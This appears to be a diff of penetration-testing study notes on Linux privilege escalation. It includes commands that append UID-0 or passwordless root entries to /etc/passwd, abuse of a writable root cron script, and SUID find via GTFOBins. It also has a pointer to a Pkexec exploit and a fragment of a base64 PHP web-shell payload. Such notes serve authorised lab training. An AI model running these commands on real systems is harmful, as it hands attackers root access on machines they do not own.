@@ -936,7 +936,8 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - ❗**SUID - Check easy privesc, exploits and write perms**
       - `/usr/bin/find` > Exploit with GTFOBins
     - ❗**Interesting writable files**
-      - `/etc/passwd` `/etc/sudoers.d/` > Modify /etc/passwd to create a root shell > `echo 'malicioususer:x:0:0::/root:/bin/bash' >> /etc/passwd su malicioususer`  
+      - `/etc/passwd` `/etc/sudoers.d/` > Modify /etc/passwd to create a root shell > `echo 'malicioususer:x:0:0::/root:/bin/bash' >> /etc/passwd su malicioususer`
+    - `grep -E "hash SUID bit set" linpeas_output.txt` > Goolge exploit "Pkexec Privilege Escalation poc"  
     - Check for vulnerable cron jobs
       - `-rwxrwxrwx 1 root root 1234 /etc/cron.d/backup.sh` > edit the writable backup.sh > `echo 'root::0:0::/root:/bin/bash' >> /etc/passwd`  
     - Checking all env variables
@@ -955,34 +956,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - Download from https://pentestmonkey.net/tools/audit/unix-privesc-check  
     - `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check <user>@<target>:/home/joe`  
     - `joe@debian-privesc:~$ ./unix-privesc-check standard > unix-privesc-check.txt`  
-    - Look for writable files "WARNING:"
-    - Useful grep
-      ```
-      # SUID/SGID binaries (potential privesc)
-      grep -i "suid" unix-privesc-check.txt
-      grep -i "sgid" unix-privesc-check.txt
-      
-      # World-writable / weak permissions
-      grep -i "write" unix-privesc-check.txt
-      grep -i "writable" unix-privesc-check.txt
-      
-      # Config files, passwords, keys
-      grep -i "password" unix-privesc-check.txt
-      grep -i "shadow" unix-privesc-check.txt
-      grep -i "key" unix-privesc-check.txt
-      
-      # Services, jobs, scripts
-      grep -i "cron" unix-privesc-check.txt
-      grep -i "service" unix-privesc-check.txt
-      grep -i "rc.d" unix-privesc-check.txt
-      
-      # Network capabilities / setcap
-      grep -i "cap" unix-privesc-check.txt
-      
-      # Users & sudo
-      grep -i "sudo" unix-privesc-check.txt
-      grep -i "uid" unix-privesc-check.txt
-      ```
+    - Look for writable files "WARNING:"  
 - Exposed Credential Info  
   - Env variables  
     `joe@debian-privesc:~$ env`
